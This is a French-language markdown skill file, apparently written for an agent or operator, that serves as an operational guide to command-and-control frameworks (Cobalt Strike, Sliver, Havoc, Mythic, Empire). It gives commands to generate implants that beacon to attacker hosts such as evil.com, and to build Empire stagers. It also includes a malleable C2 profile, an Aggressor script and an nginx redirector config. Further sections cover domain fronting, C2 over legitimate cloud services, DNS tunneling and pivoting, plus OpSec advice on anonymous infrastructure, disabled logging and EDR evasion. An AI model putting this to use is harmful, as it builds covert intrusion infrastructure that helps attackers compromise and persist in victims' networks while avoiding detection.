---
name: c2-frameworks
description: C2 Frameworks — Cobalt Strike, Sliver, Havoc, Mythic, Nighthawk, Empire, redirection, CDN proxying, et infrastructure de command & control
tags: [C2, cobalt-strike, sliver, havoc, mythic, empire, redirector, infrastructure]
version: 1.0
---

# C2 Frameworks

Guide complet des frameworks Command & Control — déploiement d'infrastructure, gestion d'agents, opérations persistantes, et évasion réseau.

## 1. Cobalt Strike

### Installation & License
```bash
# Cobalt Strike 4.x (license required)
# Linux : ./teamserver <ip> <password> [/path/to/c2.profile]
# Windows : connect with Cobalt Strike client

# Teamserver
./teamserver 10.0.0.1 password c2.profile

# Configuration malleable C2 (profile)
# http-get, http-post, dns-beacon, smb-beacon
# Personnaliser chaque aspect du trafic C2
```

### Malleable C2 Profile
```perl
# Exemple de profile personnalisé
http-get {
    set uri "/api/update";
    client {
        header "Accept" "application/json, text/plain, */*";
        header "X-Requested-With" "XMLHttpRequest";
        parameter "version" "{{ version }}";
        metadata {
            base64url;
            prepend "user=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "application/json";
        header "Server" "nginx/1.24.0";
        output {
            netbios;
            prepend "{\"data\":\"";
            append "\"}";
        }
    }
}

http-post {
    set uri "/api/submit";
    client {
        header "Accept" "application/json";
        id {
            prepend "session=";
            header "Cookie";
        }
        output {
            base64url;
            print;
        }
    }
}
```

### Sleep Mask & Obfuscation
```bash
# Cobalt Strike 4.7+ : Sleep Mask Kit
# Custom sleep mask for beacon memory scanning evasion
# Compile C code → custom sleep mask
# Prevents memory scanning during sleep cycles
```

### Aggressor Script
```perl
# Cobalt Strike automation
alias scan_port {
    local('$port $host');
    $port = $1;
    $host = $2;
    bshell($1, "Test-NetConnection -ComputerName $host -Port $port");
}

on heartbeat_30m {
    # Check all beacons
    beacon_cmd_all("powershell Get-Process | Where-Object {$_.SessionId -ne 0}");
}
```

## 2. Sliver (Open Source)

```bash
# Install
curl https://sliver.sh/install | sudo bash
# ou compilé
git clone https://github.com/BishopFox/sliver
make

# Serveur
sudo sliver-server
sliver-server > multiplayer
sliver-server > new-operator --name operator1 --lhost 10.0.0.1

# Générer implant
sliver > generate --mtls 10.0.0.1:443 --os windows --arch amd64 --save /tmp/implant.exe
sliver > generate --http 10.0.0.1:80 --save /tmp/implant.exe
sliver > generate --dns evil.com --save /tmp/implant.exe

# Profiles
sliver > profiles new --mtls 10.0.0.1:443 --canary myprofile
sliver > generate --profile myprofile --save /tmp/implant.exe

# Commandes
sliver > use <session-id>
sliver (implant) > shell
sliver (implant) > execute-assembly /tmp/seatbelt.exe
sliver (implant) > socks5 start
sliver (implant) > pivots
```

## 3. Havoc (Open Source)

```bash
# Install
git clone https://github.com/HavocFramework/Havoc
cd Havoc && make
# Config : client/havoc.yaotl + teamserver/havoc.yaotl

# Démarrer
./havoc server
# puis client
./havoc client

# Agent features
# - Sleep Obfuscation (Ekko, Foliage)
# - Indirect syscalls
# - ETW/AMSI patching
# - x64 + x86 support
# - Custom DLL loaders
```

## 4. Mythic (Open Source)

```bash
# Install (Docker)
git clone https://github.com/MythicMeta/Mythic
cd Mythic
sudo make

# Config
# http://localhost:7443 (admin)
# Ajouter des agents (payload types)

# Agents disponibles
# - Apollo (Windows, .NET)
# - Poseidon (macOS)
# - Athena (Linux)
# - Medusa (Windows, C/C++)
# - Scylla (Linux, C)

# Mythic scripting
mythic-cli install github https://github.com/MythicC2Profiles/http
mythic-cli add agent apollo
```

## 5. Empire (PowerShell/C#)

```bash
# Install
git clone https://github.com/BC-SECURITY/Empire
cd Empire && sudo ./setup/install.sh
sudo ./empire

# Générer stager
(Empire) > usestager windows/launcher_bat
(Empire) > set Listener http
(Empire) > set OutFile /tmp/stager.bat
(Empire) > execute

# SharpShell (C# agent)
# Plugin : execute-assembly, dotnet commands
```

## 6. Infrastructure C2

### Redirectors (Nginx / Apache)
```nginx
# Reverse proxy vers C2 server
# Nginx redirector (public facing)
server {
    listen 443 ssl;
    server_name cdn.evil.com;
    
    ssl_certificate /etc/letsencrypt/live/cdn.evil.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn.evil.com/privkey.pem;
    
    location / {
        proxy_pass https://real-c2-server:443;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_ssl_verify off;
    }
}
```

### Domain Fronting (CDN)
```bash
# Technique : CDN → C2
# 1. Cloudflare / AWS CloudFront / Azure CDN
# 2. Host header = CDN domain
# 3. C2 server = origin behind CDN
# 4. Trafic = HTTPS to CDN → C2

# AWS CloudFront
# - Origin : C2 server IP
# - Behaviour : forward all headers
# - Domain : cloudfront.net
```

### Live Hosting (Domain Fronting 2.0)
```bash
# Utiliser des services légitimes comme proxy
# - Google Cloud Functions
# - AWS Lambda
# - Azure Functions
# - GitHub Pages (static)
# - Google App Engine

# Google App Engine (free tier)
# Proxie via appspot.com
# Host header : project.appspot.com
```

### C2 via Legitimate Services
```bash
# - Microsoft 365 (Graph API)
# - Google Drive API
# - Discord webhooks
# - Slack API
# - Telegram bot API
# - GitHub issues/Gist
# - Twitter DMs
# - AWS SQS/SNS

# Avantage : trafic difficile à bloquer
# Désavantage : tier API limits
```

## 7. C2 Protocol Evasion

### Traffic Normalization
```bash
# Mimic normal traffic
# - HTTP/2 (HTTP2)
# - WebSocket
# - Server-Sent Events
# - gRPC
# - QUIC (UDP-based)

# Certificate = Let's Encrypt (légitime)
# JA3 fingerprint = mimic browser (Chrome, Firefox)
# JARM fingerprint = mimic CDN/cloud provider
```

### Domain Rotation
```bash
# DGA (Domain Generation Algorithm)
# - Période de validité courte
# - Prédiction de prochains domaines
# - Domain fronting ready

# Flux des domaines
# 1. Domain prédit via DGA
# 2. Résolution DNS → C2 IP
# 3. Communication
# 4. Domain blacklisté → nouveau domaine DGA
```

### C2 via DNS
```bash
# DNS TXT records : commandes
# DNS A records : beacon IP
# DNS tunneling : exfiltration

# Protocoles
# - dnscat2
# - iodine
# - Cobalt Strike DNS Beacon
```

## 8. Pivoting & Proxy

```bash
# SOCKS proxy via beacon
# Pivoting vers réseaux internes

# Cobalt Strike
beacon > socks 1080
beacon > rportfwd 8080 10.0.0.2 80

# Sliver
sliver > socks5 start
sliver > pivot add --name pivot1 --bind 0.0.0.0:1080
sliver > pivots
```

## 9. OpSec

### Infrastructure Hygiene
```bash
# - VPS : chèques par crypto, VPN OVH/Hetzner
# - Domaines : registrars anonymes (Njalla, Porkbun)
# - Certificats : Let's Encrypt (auto-renew)
# - Logs : désactiver logging sur redirectors
# - Backup : redirectors indépendants
```

### EDR Detection Avoidance
```bash
# - Sleep jitter (random sleep)
# - SMB named pipes (lateral)
# - TCP over SMB (pivot)
# - Custom encryption
# - No hardcoded C2 domains
# - Split DNS (C2 domain ≠ real domain)
```

## 10. Tools Compendium

| Framework | Prix | Language | Type |
|-----------|------|----------|------|
| **Cobalt Strike** | $$$ | Java/Java | Commercial |
| **Sliver** | Free | Go | Open Source |
| **Havoc** | Free | C/Go | Open Source |
| **Mythic** | Free | Python | Open Source |
| **Empire** | Free | PowerShell | Open Source |
| **Nighthawk** | $$ | C/C++ | Commercial |
| **Brute Ratel** | $$ | C/C++ | Commercial |
| **PoshC2** | Free | Python | Open Source |
| **DeimosC2** | Free | Go | Open Source |

## 11. Ressources

- **Cobalt Strike Blog** : https://www.cobaltstrike.com/blog
- **Sliver** : https://github.com/BishopFox/sliver
- **Havoc** : https://github.com/HavocFramework/Havoc
- **Mythic** : https://github.com/MythicMeta/Mythic
- **BC-SECURITY Empire** : https://github.com/BC-SECURITY/Empire
- **C2 Matrix** : https://www.c2matrix.com
- **The TrustedVault** : https://www.thetrustedvault.io
- **SpecterOps** : C2 infrastructure posting